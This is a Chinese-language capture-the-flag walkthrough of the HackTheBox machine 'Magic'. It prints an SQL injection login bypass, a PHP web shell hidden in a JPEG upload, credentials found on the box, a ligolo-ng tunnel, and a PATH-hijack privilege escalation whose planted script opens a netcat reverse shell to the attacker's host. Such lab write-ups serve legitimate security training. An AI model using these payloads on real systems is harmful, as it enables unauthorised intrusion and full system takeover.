---
title: "Magic"
description: "这篇HackTheBox Linux 靶机 Magic 复盘用一句话串起了信息收集、立足点获取与本地提权的完整路径。"
summary: "这篇HackTheBox Linux 靶机 Magic 复盘用一句话串起了信息收集、立足点获取与本地提权的完整路径。"
date: "2024-09-21T18:47:32+08:00"
publishDate: "2024-09-21T18:47:32+08:00"
lastmod: "2024-09-21T18:47:32+08:00"
url: "/hackthebox/linux/magic/"
image: "images/oscp-banners/banner-006.jpg"
draft: false
unfinished: false
categories:
  - "OSCP"
  - "HackTheBox"
tags:
  - "Linux"
oscp_provider: "HackTheBox"
oscp_platform: "Linux"
---
<!-- oscp-refactor:meta-start -->
> 平台：Linux ｜ 来源：HackTheBox
<!-- oscp-refactor:meta-end -->

对目标服务器进行端口扫描

```
sudo nmap -p- 10.10.10.185 -open
```

![image-20240920182009227](https://s2.loli.net/2024/09/20/Q754WsueDkZFfiE.png)

对开放端口进行探测
```
sudo nmap -p22,80 -A 10.10.10.185 -oX Magic.xml
```

![image-20240920182051051](https://s2.loli.net/2024/09/20/lAWXadOYUD7h13t.png)

22端口没有可以继续利用的漏洞，从80端口继续进行探索

![image-20240921142402047](https://s2.loli.net/2024/09/21/C1w5zyFGhtniLWs.png)

通过扫描获取到以下的目录和内容，存在一个登录界面和几个403的页面，尝试使用403bypass脚本无法访问那几个页面，把注意力放到login登陆界面上，考虑这个界面应当存在sql注入

```
user: user
passwd: ' or 1=1-- 
```

![image-20240921143224867](https://s2.loli.net/2024/09/21/Q4nuvhf238RxZrm.png)

成功绕过了登录（sql注入登录绕过），出现upload页面，考虑该处是否可能存在上传过滤，优先使用php进行尝试

![image-20240921143435396](https://s2.loli.net/2024/09/21/wI6GgMx5WaPZiAf.png)

提示以下内容，可能是后缀过滤，尝试对文件后缀进行修改

![image-20240921143535675](https://s2.loli.net/2024/09/21/V2NIlcHfAXZTtbj.png)

说明对文件的mime类型具有控制，使用burp截取对应的链接内容，并在文件头部分添加+++三个字符，后续使用jpg的头文件标识在hex中进行替换FFD8FF（https://blog.csdn.net/m0_47505062/article/details/123247578）

![image-20240921151553655](https://s2.loli.net/2024/09/21/Zvbs3Xl7mLdSkug.png)

![image-20240921151616261](https://s2.loli.net/2024/09/21/VGn4vyBwqJfpxaz.png)

显示文件已成功上传，现在去找寻访问对应文件，但访问具体页面无对应内容，重新进行上传

```
<?php system($_GET["cmd"]); ?>
http://10.10.10.185/images/uploads/s.php.jpg?cmd=id
```

![image-20240921152555640](https://s2.loli.net/2024/09/21/qSBN7unVoW4zitA.png)



![image-20240921153227002](https://s2.loli.net/2024/09/21/jrXO6qxQcP7nDh4.png)

升级下终端

```
python3 -c "import pty;pty.spawn('/bin/bash')"
stty raw -echo; fg
reset
xterm
export TERM=xterm-256color
exec /bin/bash
#尝试使用Ctrl+Z挂起当前会话，然后输入
stty raw -echo; fg
reset
export SHELL=bash
export TERM=xterm-256color
exec /bin/bash
```

目前仍然在www-data用户下，需要切换到具有bash权限的用户

![image-20240921154038434](https://s2.loli.net/2024/09/21/kc6Uo47Wp3yA9xr.png)

在/var/www/magic目录下发现一个db.php5文件

![image-20240921153914956](https://s2.loli.net/2024/09/21/3ElTpeid5wjMqcJ.png)

发现一个数据库用户名和密码，但本地没有数据库也无法直接切换到对应用户

username：theseus

password：iamkingtheseus

查询本地网络，发现3306端口开放可以进行数据库访问，访问后发现本地没有安装mysql无法进行命令执行，这时候考虑建立隧道，远程访问其本地mysql

使用ligolo-ng进行隧道打通

```
攻击端
./proxy -selfcert
session
sudo ip route add 240.0.0.1 dev ligolo
nmap 240.0.0.1 -sV（尝试访问可行性）
mysql -h 240.0.0.1 -u theseus -piamkingtheseus

被攻击端
chmod +x agent
./agent -connect 10.10.16.15:11601 --ignore-cert

```

![image-20240921164545233](https://s2.loli.net/2024/09/21/Sh9OpuUyeTsQWkw.png)

成功实现数据库访问

![image-20240921164648345](https://s2.loli.net/2024/09/21/gXTG5Ac8VanWsPR.png)

发现一组用户名和密码

user：admin

password：Th3s3usW4sK1ng

使用这组账号密码在Linux服务器上进行用户切换

![image-20240921164824558](https://s2.loli.net/2024/09/21/XeGaFTzPWDuQkJ9.png)

成功切换到对应的用户，成功获取到对应的flag

```
find / -perm -4000 2>/dev/null
```

除了/usr/bin下的内容，存在以下内容

![image-20240921170347824](https://s2.loli.net/2024/09/21/wB3SgeN1uEjJhWv.png)

![image-20240921170441232](https://s2.loli.net/2024/09/21/bJms1k6Knzfd5rA.png)

其中sysinfo很可疑

```
strings sysinfo
```

![image-20240921170551215](https://s2.loli.net/2024/09/21/TPWlunGy14cgfmH.png)

发现应用程序回运行以上命令，但没有指定绝对路径，故可以考虑在本用户的path下创建一个同名文件，然后修改path使其能被找到并执行

```
#!/bin/bash
busybox nc 10.10.16.15 1234 -e bash

chmod +x free

添加本目录到PATH
echo $PATH
PATH=.:${PATH}
export PATH
echo $PATH
```

执行/bin/sysinfo文件

![image-20240921171144485](https://s2.loli.net/2024/09/21/5zEdPXpT27IQKiN.png)

成功反弹回shell

